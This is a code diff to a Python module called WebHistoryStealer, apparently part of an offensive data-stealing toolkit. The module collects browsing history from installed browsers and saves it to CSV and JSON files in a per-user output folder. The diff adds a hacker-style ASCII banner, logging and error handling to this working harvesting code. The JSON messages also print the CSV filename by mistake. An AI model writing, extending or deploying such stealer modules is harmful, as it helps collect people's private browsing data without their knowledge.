@@ -10,6 +10,18 @@ class WebHistoryStealer(ModuleManager):
     def __init__(self) -> None:
         super().__init__(module_name="WebHistoryStealer")
         
+        print("""
+     _______         _     _ _                             
+    |.-----.|       (_)   (_|_)       _                    
+    ||x . x||        _______ _  ___ _| |_ ___   ____ _   _ 
+    ||_.-._||       |  ___  | |/___|_   _) _ \ / ___) | | |
+    `--)-(--`       | |   | | |___ | | || |_| | |   | |_| |
+   __[=== o]___     |_|   |_|_(___/   \__)___/|_|    \__  |
+  |:::::::::::|\                                    (____/ 
+  `-=========-`()   
+              """)
+
+
         self.browsers_folder = os.path.join(self.output_folder_user, 'browsers')
         self.output_filename_csv = os.path.join(self.browsers_folder, 'browser_history_all.csv')
         self.output_filename_json = os.path.join(self.browsers_folder, 'browser_history_all.json')
@@ -18,16 +30,24 @@ class WebHistoryStealer(ModuleManager):
             os.makedirs(self.browsers_folder)
     
     def run(self):
-        outputs = get_history()
-    
+        try:
+            self.mdebug("Starting to load History from supported browsers")
+            outputs = get_history()
+            self.mprint("Loaded the History from supported browsers")
+        except Exception as e:
+            self.merror(f"Unable to load the History: {e}. Skipping this module")
+            return
+        
         if Constant.browser_history_csv:
             try:
                 outputs.save(f'{self.output_filename_csv}')
+                self.mprint(f"Saved Browser History as CSV to: {self.output_filename_csv}")
             except:
-                pass
+                self.merror(f"Unable to save Browser History as CSV to: {self.output_filename_csv}")
     
         if Constant.browser_history_json:
             try:
                 outputs.save(f'{self.output_filename_json}')
+                self.mprint(f"Saved Browser History as JSON to: {self.output_filename_csv}")
             except:
-                pass
+                self.merror(f"Unable to save Browser History as JSON to: {self.output_filename_csv}")
